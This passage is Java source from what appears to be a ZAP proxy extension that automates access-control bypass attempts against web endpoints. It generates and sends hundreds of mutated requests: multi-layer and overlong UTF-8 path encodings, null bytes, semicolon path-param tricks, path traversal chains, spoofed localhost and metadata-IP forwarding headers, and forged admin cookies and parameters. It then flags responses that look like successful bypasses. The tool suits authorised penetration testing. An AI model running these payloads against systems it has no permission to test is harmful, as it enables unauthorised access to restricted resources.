                        setPath.accept(c, joinPath(s)); return c; }));
            }
            String whole = sg.chars().mapToObj(ch -> "%" + Integer.toHexString(ch).toUpperCase()).reduce("", String::concat);
            final String wholeEnc = whole;
            techs.add(new Technique("Encoding", "SegEncWhole:" + sg,
                "Percent-encode entire segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = sg.chars().mapToObj(ch -> "%" + Integer.toHexString(ch).toUpperCase()).reduce("", String::concat);
                    setPath.accept(c, joinPath(s)); return c; }));
            String dblWhole = sg.chars().mapToObj(ch -> "%25" + Integer.toHexString(ch).toUpperCase()).reduce("", String::concat);
            final String dblEnc = dblWhole;
            techs.add(new Technique("Encoding", "SegEncDouble:" + sg,
                "Double-encode entire segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = sg.chars().mapToObj(ch -> "%25" + Integer.toHexString(ch).toUpperCase()).reduce("", String::concat);
                    setPath.accept(c, joinPath(s)); return c; }));
            String firstEnc = "%" + Integer.toHexString(sg.charAt(0)).toUpperCase() + sg.substring(1);
            final String firstOnly = firstEnc;
            techs.add(new Technique("Encoding", "SegEnc1st:" + sg,
                "Percent-encode first char of segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    String cs = s[ix]; s[ix] = "%" + Integer.toHexString(cs.charAt(0)).toUpperCase() + cs.substring(1);
                    setPath.accept(c, joinPath(s)); return c; }));
            if (sg.matches("^[A-Za-z0-9]+$")) {
                final String seg = sg;
                techs.add(new Technique("Encoding", "SegOverlong:" + sg,
                    "Overlong UTF-8 encode segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = seg.chars().mapToObj(ch -> "%c0%" + Integer.toHexString(0x80 | (ch & 0x3F)).toUpperCase()).reduce("", String::concat);
                        setPath.accept(c, joinPath(s)); return c; }));
            }

            // ── Novel per-segment encoding techniques ──────────────────

            // 1. Uppercase hex: %41 vs %61 -- some parsers treat hex case differently
            String wholeUpper = sg.chars()
                .mapToObj(ch -> "%" + Integer.toHexString(ch).toUpperCase())
                .reduce("", String::concat);
            final String encUpper = wholeUpper;
            techs.add(new Technique("Encoding", "SegEncUpper:" + sg,
                "Uppercase-hex percent-encode entire segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = encUpper;
                    setPath.accept(c, joinPath(s)); return c; }));

            // 2. Alternating encoded/unencoded: %61d%6d%69n -- WAF byte-boundary confusion
            StringBuilder altSb = new StringBuilder(sg.length() * 2);
            for (int ai = 0; ai < sg.length(); ai++) {
                if (ai % 2 == 0) {
                    altSb.append("%").append(Integer.toHexString(sg.charAt(ai)).toUpperCase());
                } else {
                    altSb.append(sg.charAt(ai));
                }
            }
            final String encAlt = altSb.toString();
            techs.add(new Technique("Encoding", "SegEncAlt:" + sg,
                "Alternating encoded/unencoded chars in segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = encAlt;
                    setPath.accept(c, joinPath(s)); return c; }));

            // 3. Trailing char only: encode only the LAST char -- leading is over-checked
            if (sg.length() > 1) {
                String trailEnc = sg.substring(0, sg.length() - 1)
                    + "%" + Integer.toHexString(sg.charAt(sg.length() - 1)).toUpperCase();
                final String encTrail = trailEnc;
                techs.add(new Technique("Encoding", "SegEncTrail:" + sg,
                    "Percent-encode last char of segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = encTrail;
                        setPath.accept(c, joinPath(s)); return c; }));
            }

            // 4. Slash encoding inside segment: encode '/' chars that appear within a segment
            //    Useful when segments contain encoded slashes from user input
            if (sg.contains("/")) {
                String slashEnc = sg.replace("/", "%2f");
                final String encSlash = slashEnc;
                techs.add(new Technique("Encoding", "SegEncSlash:" + sg,
                    "Encode '/' chars within segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = encSlash;
                        setPath.accept(c, joinPath(s)); return c; }));
            }

            // 5. Triple-encoded: %2525XX -- tests triple-decode layers
            String tripleEnc = sg.chars()
                .mapToObj(ch -> "%2525" + Integer.toHexString(ch).toUpperCase())
                .reduce("", String::concat);
            final String encTriple = tripleEnc;
            techs.add(new Technique("Encoding", "SegEncTriple:" + sg,
                "Triple-encode entire segment [" + ix + "] (%2525XX)",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = encTriple;
                    setPath.accept(c, joinPath(s)); return c; }));

            // 6. Overlong UTF-8 3-byte: %e0%80%XX -- different overlong form than %c0%XX
            if (sg.matches("^[A-Za-z0-9]+$")) {
                String overlong3 = sg.chars()
                    .mapToObj(ch -> "%e0%" + Integer.toHexString(0x80 | ((ch >> 6) & 0x3F)).toUpperCase()
                        + "%" + Integer.toHexString(0x80 | (ch & 0x3F)).toUpperCase())
                    .reduce("", String::concat);
                final String encOL3 = overlong3;
                techs.add(new Technique("Encoding", "SegOverlong3:" + sg,
                    "3-byte overlong UTF-8 encode segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = encOL3;
                        setPath.accept(c, joinPath(s)); return c; }));
            }

            // 7. Mixed hex case: %61%4D%69%4e -- alternating upper/lowercase hex digits
            StringBuilder mixCaseSb = new StringBuilder(sg.length() * 3);
            for (int mi = 0; mi < sg.length(); mi++) {
                String h = Integer.toHexString(sg.charAt(mi)).toUpperCase();
                if (mi % 2 == 0 && h.length() > 1) {
                    mixCaseSb.append("%").append(h.charAt(0)).append(Character.toLowerCase(h.charAt(1)));
                } else {
                    mixCaseSb.append("%").append(h);
                }
            }
            final String encMixCase = mixCaseSb.toString();
            techs.add(new Technique("Encoding", "SegEncMixCase:" + sg,
                "Mixed upper/lowercase hex in segment [" + ix + "]",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                    s[ix] = encMixCase;
                    setPath.accept(c, joinPath(s)); return c; }));

            // 8. Null-byte insertion between chars: a%00d%00m%00i%00n -- truncation injection
            if (sg.length() > 1 && sg.matches("^[A-Za-z0-9]+$")) {
                StringBuilder nullSb = new StringBuilder(sg.length() * 4);
                for (int ni = 0; ni < sg.length(); ni++) {
                    nullSb.append(sg.charAt(ni));
                    if (ni < sg.length() - 1) nullSb.append("%00");
                }
                final String encNull = nullSb.toString();
                techs.add(new Technique("Encoding", "SegNullInsert:" + sg,
                    "Insert null bytes between chars in segment [" + ix + "]",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = encNull;
                        setPath.accept(c, joinPath(s)); return c; }));
            }

            // 9. Semicolon+slash inside segment: admin;/ -- Tomcat/Apache path-param confusion
            if (sg.matches("^[A-Za-z0-9]+$")) {
                final String seg9 = sg;
                techs.add(new Technique("Encoding", "SegSemiSlash:" + sg,
                    "Append ';/' inside segment [" + ix + "] (path-param confusion)",
                    base -> {
                        HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone();
                        s[ix] = seg9 + ";/";
                        setPath.accept(c, joinPath(s)); return c; }));
            }
        }
    }

    // ─── 8. Semicolon / path-param confusion ────────────────────────────

    private void buildSemicolonTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String[] semiVariants = {";",";.",";..",";/",";%00","/..;","/.;","..;/","..;/../",
            ";%0d",";%0a",";%09",";;",";.json",";.xml",";.php",";.asp",";.txt",
            "%3b","%3b.","%3b..","%3b%00",";jsessionid=admin",";viewsource",
            ";debug",";admin",";true",";1",";secret",";internal"};
        for (String sv : semiVariants) {
            final String s = sv;
            techs.add(new Technique("Semicolon", "Semi:" + sv,
                "Append semicolon variant '" + sv + "' to path",
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.baseClean + s); return c; }));
        }
        for (int mi = 0; mi < ctx.rawSegments.length; mi++) {
            final int n = mi;
            techs.add(new Technique("Semicolon", "SegSemi:" + n,
                "Append ';' to segment [" + n + "] (Tomcat path-param)",
                base -> {
                    HttpMessage c = cloneMsg(base); String[] s = ctx.rawSegments.clone(); s[n] = s[n] + ";";
                    setPath.accept(c, joinPath(s)); return c; }));
        }
    }

    // ─── 9. Header-based bypasses ───────────────────────────────────────

    private void buildHeaderTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String[][] headerBypasses = {
            {"X-Forwarded-For","127.0.0.1"}, {"X-Forwarded-For","2130706433"},
            {"X-Forwarded-For","0x7f000001"}, {"X-Forwarded-For","0177.0.0.1"},
            {"X-Forwarded-For","::1"}, {"X-Forwarded-For","::ffff:127.0.0.1"},
            {"X-Forwarded-For","10.0.0.1"}, {"X-Forwarded-For","192.168.1.1"},
            {"X-Forwarded-For","169.254.169.254"}, {"X-Forwarded-Ip","127.0.0.1"},
            {"X-Real-Ip","127.0.0.1"}, {"X-Real-Ip","localhost"},
            {"X-Originating-Ip","127.0.0.1"}, {"X-Remote-Ip","127.0.0.1"},
            {"X-Remote-Addr","127.0.0.1"}, {"X-Client-Ip","127.0.0.1"},
            {"X-Client-Ip","127.0.0.1:80"}, {"X-Custom-IP-Authorization","127.0.0.1"},
            {"X-Custom-IP-Authorization","127.0.0.1:80"},
            {"X-Original-URL",ctx.baseClean}, {"X-Rewrite-URL",ctx.baseClean},
            {"X-Original-Url",ctx.baseClean}, {"X-Forwarded-Url",ctx.baseClean},
            {"X-Forwarded-Host","localhost"}, {"X-Forwarded-Host","127.0.0.1"},
            {"X-Host","localhost"}, {"X-Host","127.0.0.1"},
            {"X-Forwarded-Proto","https"}, {"Forwarded","for=127.0.0.1;host=localhost"},
            {"Origin","null"}, {"Referer","https://127.0.0.1" + ctx.baseClean},
            {"X-HTTP-Method-Override","GET"}, {"X-HTTP-Method-Override","POST"},
            {"X-HTTP-Method","GET"}, {"X-Method-Override","GET"},
            {"X-Requested-With","XMLHttpRequest"},
            {"Accept","application/json"},
            {"Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            {"X-Proxy-Url","http://127.0.0.1"}, {"X-Proxy-URL","http://127.0.0.1"},
            {"X-Original-Url",ctx.baseClean + "/."}, {"X-Rewrite-URL",ctx.baseClean + "/."},
            {"X-Forwarded-Host","internal"}, {"X-Real-IP","0.0.0.0"},
            {"X-Forwarded-For","unknown"}, {"X-Forwarded-For","null"},
            {"X-Client-IP","127.0.0.1"}, {"X-Real-IP","::ffff:127.0.0.1"},
            {"X-Custom-IP-Authorization","0.0.0.0"},
            {"X-Original-URL",ctx.baseClean + ".."}, {"X-Rewrite-URL",ctx.baseClean + "/.."},
            {"X-Forwarded-Proto","http"}, {"X-Forwarded-Proto","HTTP/1.1"},
            {"X-Forwarded-Port","80"}, {"X-Forwarded-Port","8080"},
            {"X-Original-Host","localhost"}, {"X-Proxy-Host","localhost"},
            {"X-Rewrite-Host","localhost"}, {"X-Host-Name","localhost"},
            {"True-Client-IP","127.0.0.1"}, {"Client-IP","127.0.0.1"},
            {"X-Requested-With",""}, {"X-Requested-With","null"},
            {"X-WAP-Profile","http://localhost"},
            {"If-Modified-Since","Mon, 01 Jan 2000 00:00:00 GMT"},
            {"Cache-Control","no-cache"}, {"Pragma","no-cache"}
        };
        Set<String> seenHeaders = new LinkedHashSet<>();
        for (String[] h : headerBypasses) {
            String key = h[0] + ":" + h[1];
            if (seenHeaders.contains(key)) continue;
            seenHeaders.add(key);
            final String hn = h[0], hv = h[1];
            techs.add(new Technique("Headers", "Hdr:" + h[0] + "=" + h[1],
                "Add header " + h[0] + ": " + h[1],
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, hn, hv); return c; }));
        }
    }

    // ─── 10. Duplicate headers ──────────────────────────────────────────

    private void buildDuplicateHeaderTechniques(List<Technique> techs, PathContext ctx) {
        String[][] dupHeaders = {
            {"X-Forwarded-For","127.0.0.1","1.2.3.4"},
            {"X-Forwarded-For","127.0.0.1 , 1.2.3.4",null},
            {"X-Forwarded-For","1.2.3.4, 127.0.0.1",null},
            {"X-Forwarded-For","127.0.0.1.garbage",null},
            {"X-Forwarded-For","127.0.0.1#@",null},
            {"X-Forwarded-For","127.0.0.1","127.0.0.1"},
            {"X-Forwarded-For","127.0.0.1","10.0.0.1"},
            {"Host","localhost","127.0.0.1"},
            {"X-Forwarded-Host","localhost","127.0.0.1"},
            {"Authorization","Bearer admin","Bearer guest"},
            {"Cookie","session=admin","session=guest"},
            {"Content-Type","application/json","text/plain"},
            {"Accept","application/json","text/html"}
        };
        for (String[] d : dupHeaders) {
            final String hn = d[0], v1 = d[1], v2 = d[2];
            if (hn.equals("Cookie")) {
                techs.add(new Technique("Duplicate Headers", "DupHdr:" + d[0],
                    "Append cookie " + v1 + " (and " + v2 + ") to existing Cookie header",
                    base -> {
                        HttpMessage c = cloneMsg(base);
                        addCookie(c, v1);
                        if (v2 != null) addCookie(c, v2);
                        return c; }));
            } else {
                techs.add(new Technique("Duplicate Headers", "DupHdr:" + d[0],
                    "Duplicate header " + d[0] + " with parser-differential values",
                    base -> {
                        HttpMessage c = cloneMsg(base);
                        c.getRequestHeader().addHeader(hn, v1);
                        if (v2 != null) c.getRequestHeader().addHeader(hn, v2);
                        return c; }));
            }
        }
    }

    // ─── 11. IP notation variants ───────────────────────────────────────

    private void buildIPNotationTechniques(List<Technique> techs, PathContext ctx) {
        String[] ipNotations = {"127.1","127.0.1","127.0.0.1%00","0177.0.0.1","0x7F.0.0.1",
            "2130706433","[::1]","0:0:0:0:0:0:0:1",
            "0","0.0.0.0","::","::ffff:0:0",
            "0x7f.0x0.0x0.0x1","0177.1","127.0.0.0",
            "127.255.255.255","127.0.0.2","127.0.0.3",
            "[::ffff:127.0.0.1]","[0:0:0:0:0:0:0:1]",
            "[::ffff:7f00:1]","[::ffff:12700::1]",
            "017700000001","0x7f000001"};
        for (String ip : ipNotations) {
            final String val = ip;
            techs.add(new Technique("IP Notation", "XFF:" + ip,
                "X-Forwarded-For with IP notation: " + ip,
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, "X-Forwarded-For", val); return c; }));
        }
    }

    // ─── 12. Cookie / state tampering ───────────────────────────────────

    private void buildCookieTechniques(List<Technique> techs, PathContext ctx) {
        String[][] cookieBypasses = {
            {"Cookie","admin=1"}, {"Cookie","role=admin"}, {"Cookie","isAdmin=true"},
            {"Cookie","logged_in=true"}, {"Cookie","authorized=true"}, {"Cookie","admin=true"},
            {"Cookie","role=1"}, {"Cookie","user=admin"}, {"Cookie","permissions=admin"},
            {"X-Role","admin"}, {"X-Admin","true"}, {"X-User-Role","admin"},
            {"Cookie","session=admin"}, {"Cookie","auth=1"}, {"Cookie","token=admin"},
            {"Cookie","access_token=admin"}, {"Cookie","jwt=admin"},
            {"Cookie","admin=on"}, {"Cookie","debug=true"}, {"Cookie","internal=true"},
            {"Cookie","staff=1"}, {"Cookie","superuser=true"}, {"Cookie","root=1"},
            {"Cookie","uid=admin"}, {"Cookie","account=admin"},
            {"X-Admin-Token","admin"}, {"X-Session-Token","admin"},
            {"X-Access-Token","admin"}, {"X-Auth-Level","admin"},
            {"X-User-Admin","true"}, {"X-Is-Admin","true"},
            {"Cookie","session_id=admin"}, {"Cookie","sid=admin"}
        };
        for (String[] hk : cookieBypasses) {
            final String hn = hk[0], hv = hk[1];
            if (hn.equals("Cookie")) {
                techs.add(new Technique("Cookies", "CookieReplace:" + hk[1],
                    "Replace Cookie header with " + hk[1],
                    base -> { HttpMessage c = cloneMsg(base); addHeader(c, "Cookie", hv); return c; }));
                techs.add(new Technique("Cookies", "CookieAppend:" + hk[1],
                    "Append " + hk[1] + " to existing Cookie header",
                    base -> { HttpMessage c = cloneMsg(base); addCookie(c, hv); return c; }));
            } else {
                techs.add(new Technique("Cookies", "Cookie:" + hk[1],
                    "Add header " + hk[0] + ": " + hk[1],
                    base -> { HttpMessage c = cloneMsg(base); addHeader(c, hn, hv); return c; }));
            }
        }
    }

    // ─── 13. Query / param manipulation ─────────────────────────────────

    private void buildQueryParamTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String[] fakeParams = {"admin=1","role=admin","isadmin=1","admin=true","debug=1",
            "isAdmin=true","permissions=admin","access=admin","level=admin",
            "mode=debug","test=1",".*","..","%0a",
            "internal=true","staff=1","superuser=true","root=1",
            "user=admin","account=admin","uid=admin","debug=on",
            "api_key=admin","token=admin","secret=admin","auth=admin",
            "admin%20=1","admin%00=1","role%00=admin",
            "admin=1%26","admin=1%23","admin=1%3f",
            "role[]=admin","role[0]=admin","roles[0]=admin",
            "user.role=admin","user.admin=true","$admin=1",
            "__admin=1","_admin=1","admin_=1"};
        for (String fp : fakeParams) {
            final String p = fp;
            techs.add(new Technique("Query Params", "Param:" + fp,
                "Append privilege parameter: " + fp,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    String q = ctx.origQuery.isEmpty() ? "?" : ctx.origQuery + "&";
                    replacePath(c, ctx.baseClean + q + p);
                    return c; }));
        }
        String[] redirectKeys = {"next","return","url","redirect","dest","goto","redirect_uri"};
        for (String rk : redirectKeys) {
            final String k = rk;
            techs.add(new Technique("Query Params", "Redirect:" + rk,
                "Append redirect parameter " + rk + " pointing to real path",
                base -> {
                    HttpMessage c = cloneMsg(base);
                    String q = ctx.origQuery.isEmpty() ? "?" : ctx.origQuery + "&";
                    replacePath(c, ctx.baseClean + q + k + "=" + encodeURIComponent("/" + String.join("/", ctx.rawSegments)));
                    return c; }));
        }
    }

    // ─── 14. Content-Type routing ───────────────────────────────────────

    private void buildContentTypeTechniques(List<Technique> techs, PathContext ctx) {
        String[] contentTypes = {"application/xml","text/xml","application/json",
            "multipart/form-data; boundary=x","application/x-www-form-urlencoded","text/plain",
            "application/xml; charset=utf-8","text/xml; charset=utf-8",
            "application/json; charset=utf-8","application/xml; charset=utf-16",
            "text/yaml","application/x-yaml","text/csv","application/protobuf",
            "application/msgpack","application/cbor","application/graphql",
            "multipart/mixed","multipart/alternative","application/octet-stream",
            "text/html","application/xhtml+xml","application/atom+xml",
            "application/rss+xml","application/soap+xml","application/ld+json",
            "application/vnd.api+json","application/hal+json","application/json-patch+json"};
        for (String ct : contentTypes) {
            final String val = ct;
            techs.add(new Technique("Content-Type", "CT:" + ct,
                "Set Content-Type to: " + ct,
                base -> { HttpMessage c = cloneMsg(base); addHeader(c, "Content-Type", val); return c; }));
        }
    }

    // ─── 15. Double / leading slash ─────────────────────────────────────

    private void buildLeadingSlashTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        // Classic: Multiple leading slashes
        String[] classicSlashes = {"/","//","///","////","/////"};
        for (String ds : classicSlashes) {
            final String d = ds;
            techs.add(new Technique("Leading Slash", "LeadSlash:" + ds.replace("/", "S"),
                "Prefix path with " + ds.length() + " slashes",
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, d + ctx.baseClean); return c; }));
        }

        // Rare: Encoded slashes
        String[] rareSlashes = {
            "%2f",  // Single encoded slash
            "%2f%2f",  // Double encoded
            "%252f",  // Double encoded
            "%2f%2f%2f",  // Triple encoded
            "%255f",  // Encoded underscore (different char)
        };
        for (String ds : rareSlashes) {
            final String d = ds;
            techs.add(new Technique("Leading Slash", "LeadEncSlash:" + ds.replace("%", "P"),
                "Prefix with encoded slash: " + ds,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, d + ctx.baseClean); return c; }));
        }

        // Rare: Mixed slash encodings
        String[] rareMixed = {
            "/%2f",  // One real, one encoded
            "//%2f",  // Two real, one encoded
            "%2f/",  // One encoded, one real
            "/%2f/",  // Mixed
        };
        for (String ds : rareMixed) {
            final String d = ds;
            techs.add(new Technique("Leading Slash", "LeadMixed:" + ds.replace("%", "P").replace("/", "S"),
                "Mixed slash encoding: " + ds,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, d + ctx.baseClean); return c; }));
        }

        // Novel: Backslash variants (Windows path confusion)
        String[] novelBackslash = {
            "\\",  // Single backslash
            "\\\\",  // Double backslash
            "/\\",  // Forward + backslash
            "\\/",  // Backslash + forward
            "%5c",  // Encoded backslash
            "%5c%5c",  // Double encoded
            "%255c",  // Triple encoded
            "/%5c",  // Mixed
            "\\/%2f",  // Triple mixed
        };
        for (String ds : novelBackslash) {
            final String d = ds;
            techs.add(new Technique("Leading Slash", "LeadBS:" + ds.replace("%", "P").replace("\\", "BS"),
                "Backslash variant: " + ds,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, d + ctx.baseClean); return c; }));
        }

        // Novel: Windows UNC path bypass (\\?\ or \\?\UNC\ prefix)
        // Some Windows IIS/ASP.NET servers accept UNC-style paths
        // These get sent in the URL field; many backends strip them differently
        String[] uncVariants = {
            "\\\\?\\" + ctx.baseClean.replace("/", "\\"),
            "\\\\?\\" + ctx.baseClean,
            "\\\\localhost\\" + ctx.baseClean.replace("/", "\\"),
            "//?/" + ctx.baseClean,
            "//?\\" + ctx.baseClean,
        };
        for (String unc : uncVariants) {
            final String u = unc;
            techs.add(new Technique("Leading Slash", "LeadUNC:" + unc.substring(0, 3).replace("\\", "BS").replace("?", "Q"),
                "Windows UNC path: " + u,
                base -> { HttpMessage c = cloneMsg(base); setLiteralPath(c, u); return c; }));
        }

        // Novel: Null-byte / control char after slash
        String[] novelSlashCtrl = {
            "/%00",  // Slash + null
            "/%20",  // Slash + space
            "/%09",  // Slash + tab
            "//%00",  // Double slash + null
            "/%2e",  // Slash + encoded dot (traversal disguised)
            "/%2e%2e",  // /..
        };
        for (String ds : novelSlashCtrl) {
            final String d = ds;
            techs.add(new Technique("Leading Slash", "LeadCtrl:" + ds.replace("%", "P"),
                "Slash with control char: " + ds,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, d + ctx.baseClean); return c; }));
        }
    }

    // ─── 16. Encoding chain ─────────────────────────────────────────────

    private void buildEncodingChainTechniques(List<Technique> techs,
            BiConsumer<HttpMessage, String> setPath, PathContext ctx) {
        String[] encChains = {"%2e%2e%2f","%2e%2e%2f%2e%2e%2f","%252e%252e%252f","%c0%ae%c0%ae%2f",
            "%2e%2e%5c","%2e%2e/","..%252f","..%c0%af"};
        for (String ce : encChains) {
            final String c2 = ce;
            techs.add(new Technique("Encoding Chain", "EncChain:" + ce,
                "Encoded traversal chain: " + ce,
                base -> { HttpMessage c = cloneMsg(base); setPath.accept(c, ctx.parent + c2 + ctx.lastSeg); return c; }));
        }
    }


    // ─── Response classification ────────────────────────────────────────

    public boolean looksLikeErrorPage(int status, String body, int bodyLen, int baselineLen) {
        if (status == 200 || status == 404 || status == 302 || status == 301) {
            if (body.length() > 0 && ERROR_MARKERS.matcher(body).find()) {
                return true;
            }
            if (bodyLen > 0 && baselineLen > 0) {
                double ratio = (double) bodyLen / baselineLen;
                if (ratio > 0.88 && ratio < 1.12) return true;
            }
        }
        return false;
    }

    // ─── Run a single technique ─────────────────────────────────────────

    /** Sends via ZAP's {@code HttpSender}, applying the configured per-probe timeout. */
    private void sendNormal(HttpMessage msg, org.parosproxy.paros.network.HttpSender sender)
            throws Exception {
        // X-Hacktor-WirePath is a display-only side channel (setLiteralPath stores the
        // exact wire target here). It must never reach the server: RawHttpSender strips
        // it itself, but the normal sender would happily emit it as a request header.
        // Save it for the Results path column and restore it afterwards.
        String saved = null;
        try { saved = msg.getRequestHeader().getHeader("X-Hacktor-WirePath"); } catch (Exception ignored) {}
        boolean had = saved != null && !saved.isEmpty();
        if (had) {
            try { msg.getRequestHeader().setHeader("X-Hacktor-WirePath", null); } catch (Exception ignored) {}
        }
        try {
            if (soTimeoutSecs > 0) {
                HttpRequestConfig cfg = HttpRequestConfig.builder()
                    .setSoTimeout(soTimeoutSecs * 1000)
                    .build();
                sender.sendAndReceive(msg, cfg);
            } else {
                sender.sendAndReceive(msg);
            }
        } finally {
            if (had) {
                try { msg.getRequestHeader().setHeader("X-Hacktor-WirePath", saved); } catch (Exception ignored) {}
            }
        }
    }

    private static Technique.Verdict classifyVerdict(int status, boolean isErr, boolean realChange) {
        if (isErr) {
            return realChange ? Technique.Verdict.SUPPRESSED : Technique.Verdict.NO_CHANGE;
        }
        if (status == 200 || status == 201 || status == 202 || status == 204) {
            return Technique.Verdict.CANDIDATE;
        }
        if (status != 401 && status != 403 && status != 400 && realChange) {
            return Technique.Verdict.CANDIDATE;
        }
        return Technique.Verdict.NO_CHANGE;
    }

    public Result runOne(
            HttpMessage base,
            Technique tech,
            org.parosproxy.paros.network.HttpSender sender,
            boolean suppressErrors,
            int baselineStatus,
            int baselineLen,
            String baselineBody) {
        HttpMessage mutated;
        try {
            mutated = tech.isCustom() ? applyCustom(base, tech) : tech.apply(base);
        } catch (Exception e) {
            return null;
        }
        if (mutated == null) return null;

        // Inject the user-configured custom headers (if any) into every request,
        // regardless of technique, so they are present on both send paths below.
        // Each rule may SET (replace), APPEND (join after), or PREPEND (join before)
        // the existing value of its header; values within a rule are comma-joined.
        for (CustomHeader ch : customHeaders) {
            applyCustomHeader(mutated, ch);
        }
        for (CustomHeader ch : fixedHeaders) {
            applyCustomHeader(mutated, ch);
        }
        for (BodyPayload p : bodyPayloads) {
            applyBodyPayload(mutated, p);
        }

        // Fragments are silently stripped by ZAP's HttpSender (commons-httpclient
        // builds the wire request line from path+query only), and malformed request
        // lines / verbs / HTTP/2 pseudo-headers are re-normalised there too. For
        // techniques marked needsRawWire (or that carry a literal '#' fragment) we
        // serialise and send over a raw socket so the exact bytes reach the server /
        // proxy; any failure falls back to the normal sender. The UI may also force
        // the raw socket for every probe ("Raw wire for ambiguous requests").
        boolean rawWire = forceRawWire || tech.needsRawWire() || hasLiteralFragment(mutated);
        try {
            if (rawWire) {
                if (!RawHttpSender.send(mutated, soTimeoutSecs)) {
                    sendNormal(mutated, sender);
                }
            } else {
                sendNormal(mutated, sender);
            }
        } catch (Exception e) {
            return null;
        }
        // Time-based monitoring: the raw sender reports ISO-8601 timestamps on a
        // side-channel header. reqTime = when the request was sent, resTime = when
        // the response was received. The normal sender cannot split phases, so
        // its total round-trip is captured as the receive timestamp.
        String reqTime = "-";
        String resTime = "-";
        String timing = null;
        try { timing = mutated.getRequestHeader().getHeader("X-Hacktor-Timing"); } catch (Exception ignored) {}
        if (timing != null && !timing.isEmpty()) {
            for (String part : timing.split(";")) {
                int eq = part.indexOf('=');
                if (eq < 0) continue;
                String val = part.substring(eq + 1).trim();
                if (part.regionMatches(true, 0, "req", 0, 3)) reqTime = val;
                else if (part.regionMatches(true, 0, "res", 0, 3)) resTime = val;
            }
            // Always strip the measurement marker so it never appears in the request
            // viewer or leaks onto a resend.
            try { mutated.getRequestHeader().setHeader("X-Hacktor-Timing", null); } catch (Exception ignored) {}
        }
        // The normal sender cannot split phases; capture the current time as the
        // receive timestamp so multi-run comparisons stay meaningful.
        if ("-".equals(resTime)) {
            resTime = java.time.Instant.now().toString();
        }
        int status = mutated.getResponseHeader().getStatusCode();
        String body = mutated.getResponseBody().toString();
        int len = body.length();
        boolean isErr = looksLikeErrorPage(status, body, len, baselineLen);
        boolean realChange = (status != baselineStatus);
        Technique.Verdict verdict = classifyVerdict(status, isErr, realChange);
        if (verdict == Technique.Verdict.NO_CHANGE && !realChange
                && len == baselineLen && body.equals(baselineBody)) {
            return null;
        }
        String path;
        try {
            // For techniques using setLiteralPath (Padding, Backslash, UNC, etc.) the
            // wire path differs from the URI's encoded path. Show the literal path.
            String wirePath = mutated.getRequestHeader().getHeader("X-Hacktor-WirePath");
            if (wirePath != null && !wirePath.isEmpty()) {
                path = wirePath;
            } else {
                path = mutated.getRequestHeader().getURI().getEscapedPathQuery();
            }
        } catch (Exception e) { path = currentPath(mutated); }
        // The wire-path marker is a transport/display side channel only. It must not
        // linger on the stored message: the request viewer, curl builder, CSV export
        // and a resend would otherwise surface (or even transmit) it as a real header.
        try { mutated.getRequestHeader().setHeader("X-Hacktor-WirePath", null); } catch (Exception ignored) {}
        String sample = len > 500 ? body.substring(0, 500) : body;
        return new Result(tech, path, verdict, baselineStatus, status, baselineLen, len, isErr,
            sample, mutated, reqTime, resTime);
    }

    // ─── Run all enabled techniques ─────────────────────────────────────

    public void runAll(
            HttpMessage base,
            List<Technique> techniques,
            org.parosproxy.paros.network.HttpSender sender,
            boolean followRedirects,
            boolean suppressErrors,
            ProgressListener listener) {

        runAll(base, techniques, () -> sender, followRedirects, suppressErrors, 1, listener, null);
    }

    public void runAll(
            HttpMessage base,
            List<Technique> techniques,
            Supplier<org.parosproxy.paros.network.HttpSender> senderSupplier,
            boolean followRedirects,
            boolean suppressErrors,
            int threadCount,
            ProgressListener listener) {

        runAll(base, techniques, senderSupplier, followRedirects, suppressErrors, threadCount, listener, null);
    }

    public void runAll(
            HttpMessage base,
            List<Technique> techniques,
            Supplier<org.parosproxy.paros.network.HttpSender> senderSupplier,
            boolean followRedirects,
            boolean suppressErrors,
            int threadCount,
            ProgressListener listener,
            boolean[] cancelled) {

        org.parosproxy.paros.network.HttpSender baseSender = senderSupplier.get();
        baseSender.setFollowRedirect(followRedirects);
        try {
            HttpMessage baselineMsg = cloneMsg(base);
            int baselineStatus = -1, baselineLen = 0;
            String baselineBody = "";
            try {
                baseSender.sendAndReceive(baselineMsg);
                baselineStatus = baselineMsg.getResponseHeader().getStatusCode();
                baselineBody = baselineMsg.getResponseBody().toString();
                baselineLen = baselineBody.length();
            } catch (Exception e) {
